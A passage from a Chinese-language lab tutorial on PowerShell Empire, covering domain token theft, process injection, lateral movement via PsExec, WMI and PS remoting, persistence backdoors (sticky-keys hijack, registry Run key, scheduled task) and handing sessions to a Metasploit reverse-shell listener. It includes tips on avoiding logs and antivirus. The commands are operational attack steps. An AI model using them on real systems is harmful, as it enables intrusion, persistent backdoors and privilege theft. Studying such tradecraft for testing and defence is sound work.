[![http://p4.qhimg.com/t01276d4b1f7adf2850.png](http://p4.qhimg.com/t01276d4b1f7adf2850.png)](http://p4.qhimg.com/t01276d4b1f7adf2850.png)

发现有域用户在此服务器上登陆，此时我们可以窃取域用户身份，然后进行横向移动，首先先来窃取身份，使用命令pth<ID>，这里的ID号就是creds下的CredID号，我们这里来窃取administrator的身份令牌，执行Pth 7命令，如下图所示。

[![http://p1.qhimg.com/t01093e0c55492cae2d.png](http://p1.qhimg.com/t01093e0c55492cae2d.png)](http://p1.qhimg.com/t01093e0c55492cae2d.png)

可以看到进程号为1380，使用steal_token PID命令就窃取了该身份令牌了，如下图所示。

[![http://p6.qhimg.com/t01f59d161eef73ac92.png](http://p6.qhimg.com/t01f59d161eef73ac92.png)](http://p6.qhimg.com/t01f59d161eef73ac92.png)

同样我们也可以在通过PS命令查看当前进程，查看是否有域用户的进程，如下图所示。

[![http://p9.qhimg.com/t01a6be26a2752e15d5.png](http://p9.qhimg.com/t01a6be26a2752e15d5.png)](http://p9.qhimg.com/t01a6be26a2752e15d5.png)

可以看到有域用户的进程，这里我们选用同一个Name为CMD，PID为1380的进程，如下图所示。

[![http://p9.qhimg.com/t01f335620a190e503d.png](http://p9.qhimg.com/t01f335620a190e503d.png)](http://p9.qhimg.com/t01f335620a190e503d.png)

同样通过steal_token命令来窃取这个命令，我们先尝试访问域内另一台主机WIN7-X86的“C$”，顺利访问，如下图所示。

[![http://p1.qhimg.com/t015c6b27e1b080e436.png](http://p1.qhimg.com/t015c6b27e1b080e436.png)](http://p1.qhimg.com/t015c6b27e1b080e436.png)

输入revtoself命令可以将令牌权限恢复到原来的状态，如下图所示：

[![http://p7.qhimg.com/t016d0d44ae7faeb8c3.png](http://p7.qhimg.com/t016d0d44ae7faeb8c3.png)](http://p7.qhimg.com/t016d0d44ae7faeb8c3.png)

## 2.会话注入

我们也可以使用usemodule management/psinject模块来进程注入，获取权限，输入info查看参数设置，如下图所示。

[![http://p9.qhimg.com/t01d90d8d5df647269f.png](http://p9.qhimg.com/t01d90d8d5df647269f.png)](http://p9.qhimg.com/t01d90d8d5df647269f.png)

设置下Listeners和ProcID这2个参数，这里的ProcID还是之前的CMD的1380，运行后反弹回一个域用户权限shell，如下图所示。

[![http://p5.qhimg.com/t01ffb93786542a10fc.png](http://p5.qhimg.com/t01ffb93786542a10fc.png)](http://p5.qhimg.com/t01ffb93786542a10fc.png)

## 3.Invoke-PsExec

PsExec是我在Metasploit下经常使用的模块，还有pstools工具包当中也有psexec，缺点是该工具基本杀毒软件都能检测到，并会留下日志，而且需要开启admin$ 445端口共享。优点是可以直接返回SYSTEM权限。这里我们要演示的是Empire下的Invoke-Psexec模块。

使用该模块的前提是我们已经获得本地管理员权限，甚至域管理员账户，然后以此来进一步持续渗透整个内网。

我们测试该模块前看下当前agents，只有一个IP为192.168.31.251，机器名为WIN7-64的服务器，如下图所示。

[![http://p5.qhimg.com/t01b091ecae61f2342a.png](http://p5.qhimg.com/t01b091ecae61f2342a.png)](http://p5.qhimg.com/t01b091ecae61f2342a.png)

现在使用模块usemodule lateral_movement/invoke_psexec渗透域内另一台机器WIN7-X86，输入info查看设置参数，如下图所示。

[![http://p0.qhimg.com/t01d154d67dc6f81199.png](http://p0.qhimg.com/t01d154d67dc6f81199.png)](http://p0.qhimg.com/t01d154d67dc6f81199.png)

这里要设置下机器名和监听，输入下列命令，反弹成功。如下图所示。

```
`Set ComputerName WIN7-X86.shuteer.testlab``Set Listenershuteer``Execute`
```

[![http://p0.qhimg.com/t013c80b7cfa596468a.png](http://p0.qhimg.com/t013c80b7cfa596468a.png)](http://p0.qhimg.com/t013c80b7cfa596468a.png)

输入agents命令查看当前agents，多了一个IP为192.168.31.158，机器名为WIN7-X86的服务器，如下图所示。

[![http://p0.qhimg.com/t010f1503958893620b.png](http://p0.qhimg.com/t010f1503958893620b.png)](http://p0.qhimg.com/t010f1503958893620b.png)

## 4.Invoke-WMI

它比PsExec安全，所有window系统启用该服务，当攻击者使用wmiexec来进行攻击时，Windows系统默认不会在日志中记录这些操作，这意味着可以做到攻击无日志，同时攻击脚本无需写入到磁盘，具有极高的隐蔽性。但防火墙开启将会无法连接。输入usemodule lateral_movement/invoke_wmi，使用该模块，输入info命令查看具体参数，如下图所示。

[![http://p7.qhimg.com/t0194c6bc2362b18a9b.png](http://p7.qhimg.com/t0194c6bc2362b18a9b.png)](http://p7.qhimg.com/t0194c6bc2362b18a9b.png)

这里一样需要设置下机器名和监听，输入下列命令，执行execute命令反弹成功。如下图所示。

```
`Set ComputerName WIN7-X86.shuteer.testlab``Set Listener shuteer``Execute`
```

[![http://p3.qhimg.com/t01fb7cbf084ae02255.png](http://p3.qhimg.com/t01fb7cbf084ae02255.png)](http://p3.qhimg.com/t01fb7cbf084ae02255.png)

WMI还有一个usemodule lateral_movement/invoke_wmi_debugger模块，是使用WMI去设置五个Windows Accessibility可执行文件中任意一个的调试器。这些可执行文件包括sethc.exe（粘滞键，五下shift可触发），narrator.exe（文本转语音，Utilman接口激活）、Utilman.exe（windows辅助管理器，Win+U启用），Osk.exe（虚拟键盘，Utilman接口启用）、Magnify.exe（放大镜，Utilman接口启用）。大家也可以尝试一下。

5.Powershell Remoting

PowerShell remoting是Powershell的远程管理功能，开启[Windows远程管理服务](https://msdn.microsoft.com/en-us/library/aa384426(v=vs.85).aspx)WinRM会监听5985端口，该服务默认在Windows Server 2012中是启动的，在Windows Server 2003、2008和2008 R2需要通过手动启动。

如果目标主机启用了PSRemoting，或者拥有启用它的权限的凭据，则可以使用他来进行横向渗透，使用usemodule lateral_movement/invoke_psremoting模块，如下图所示。

[![http://p1.qhimg.com/t01ed43a99f58c2e275.png](http://p1.qhimg.com/t01ed43a99f58c2e275.png)](http://p1.qhimg.com/t01ed43a99f58c2e275.png)

 

 

# 8>后门

 

------

## 1.权限持久性劫持shift后门

输入命令usemodule lateral_movement/invoke_wmi_debuggerinfo模块，输入info查看设置参数，如下图所示。

[![http://p4.qhimg.com/t010a13d7fc09e80031.png](http://p4.qhimg.com/t010a13d7fc09e80031.png)](http://p4.qhimg.com/t010a13d7fc09e80031.png)

 

这里需要设置几个参数，我们输入下面命令，如下图所示。

[![http://p2.qhimg.com/t01d06f33cce9e68f52.png](http://p2.qhimg.com/t01d06f33cce9e68f52.png)](http://p2.qhimg.com/t01d06f33cce9e68f52.png)

   set TargetBinary sethc.exe   #设置后门程序

​	set  ComputerName Dll-PC    #设置计算机名称

​	set  Listener	yu  	#设置监听线程。

```
`set` `Listener  shuteer``set` `ComputerName  WIN7-64.shuteer.testlab``set` `TargetBinary sethc.exe``execute`
```

运行后，在目标主机远程登录窗口按5次shift即可触发后门，有一个黑框一闪而过，如下图所示。

[![ ](http://p7.qhimg.com/t01f45094248a19cea0.png)](http://p7.qhimg.com/t01f45094248a19cea0.png)

这里看我们的Empire已经有反弹代理上线，这里为了截图我按了3回shift后门，所以弹回来3个代理，如下图所示。

[![http://p3.qhimg.com/t01d02c90b0fbfa228e.png](http://p3.qhimg.com/t01d02c90b0fbfa228e.png)](http://p3.qhimg.com/t01d02c90b0fbfa228e.png)

注意：sethc.exe这里有几个可以替换的选项。

A.Utilman.exe（快捷键为: Win + U）

B.osk.exe（屏幕上的键盘Win + U启动再选择）

C.Narrator.exe (启动讲述人Win + U启动再选择)

D.Magnify.exe(放大镜Win + U启动再选择）

## 2.注册表注入后门

使用usemodule persistence/userland/registry模块，运行后会在目标主机启动项添加一个命令，按如下命令设置其中几个参数，如下图所示。

 

```
set Listener shuteer
set RegPath HKCU:Software\Microsoft\Windows\CurrentVersion\Run
execute
```

[![http://p2.qhimg.com/t01e5adfb0a753e431f.png](http://p2.qhimg.com/t01e5adfb0a753e431f.png)](http://p2.qhimg.com/t01e5adfb0a753e431f.png)

运行后当我们登陆系统时候就会运行，反弹回来，如下图所示。

[![http://p3.qhimg.com/t01415ca6a1fe613da8.png](http://p3.qhimg.com/t01415ca6a1fe613da8.png)](http://p3.qhimg.com/t01415ca6a1fe613da8.png)

我们去目标机主机看看启动项下面有没有添加东西，竟然没有，真是厉害，如下图所示。

[![http://p3.qhimg.com/t01e0571af69303f67a.png](http://p3.qhimg.com/t01e0571af69303f67a.png)](http://p3.qhimg.com/t01e0571af69303f67a.png)

## 3.计划任务获得系统权限

输入usemodule persistence/elevated/schtasks，使用该模块，输入info命令查看具体参数，如下图所示。在实际渗透中，运行该模块时杀软会有提示。

[![http://p0.qhimg.com/t0181d8a61b729bf669.png](http://p0.qhimg.com/t0181d8a61b729bf669.png)](http://p0.qhimg.com/t0181d8a61b729bf669.png)

 

这里要设置DailyTime，Listener这2个参数，输入下列命令，设置完后输入execute命令运行，等设置的时间到后，成功返回一个高权限的shell，如下图所示。

 

```
Set DailyTime 16:17
Set Listener test
execute
```

[![http://p9.qhimg.com/t0189cf26f57a90320f.png](http://p9.qhimg.com/t0189cf26f57a90320f.png)](http://p9.qhimg.com/t0189cf26f57a90320f.png)

我们输入agents命令来查看当前agents，可以看到又多了一个SYSTEM权限Name为LTVZB4WDDTSTLCGL的客户端，如下图所示，提权成功。

[![http://p9.qhimg.com/t012e8e48a74611bba7.png](http://p9.qhimg.com/t012e8e48a74611bba7.png)](http://p9.qhimg.com/t012e8e48a74611bba7.png)

这里如果把set RegPath 的参数改为HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Run，那么就会在16：17分添加一个注册表注入后门，大家可以练习一下。

 

# 9.>Empire反弹回Metasploit

 

------

实际渗透中，当拿到webshell上传的MSF客户端无法绕过目标机杀软时，可以使用powershell来绕过也可以执行Empire的payload来绕过，成功之后再使用Empire的模块将其反弹回Metasploit。

这里使用usemodule code_execution/invoke_shellcode模块，输入info看下参数，如下图所示。

[![http://p4.qhimg.com/t0161e1213e1fdfd45a.png](http://p4.qhimg.com/t0161e1213e1fdfd45a.png)](http://p4.qhimg.com/t0161e1213e1fdfd45a.png)

这里修改2个参数，Lhost和Lport，Lhost修改为msf所在主机ip，按下列命令设置完毕，如下图所示。

 

```
Set Lhost 192.168.31.247
Set Lport 4444
```

[![http://p6.qhimg.com/t0180bc1d55ef364933.png](http://p6.qhimg.com/t0180bc1d55ef364933.png)](http://p6.qhimg.com/t0180bc1d55ef364933.png)

在MSF上设置监听，命令如下，运行后，就可以收到Empire反弹回来的shell了，如下图所示。

 

```
Use exploit
/multi/handler
Set payloadwindows /meterpreter/reverse_https
Set Lhost 192.168.31.247 
Set lport 4444 
Run
```

[![http://p9.qhimg.com/t013c2b13aa1efb55df.png](http://p9.qhimg.com/t013c2b13aa1efb55df.png)](http://p9.qhimg.com/t013c2b13aa1efb55df.png) 

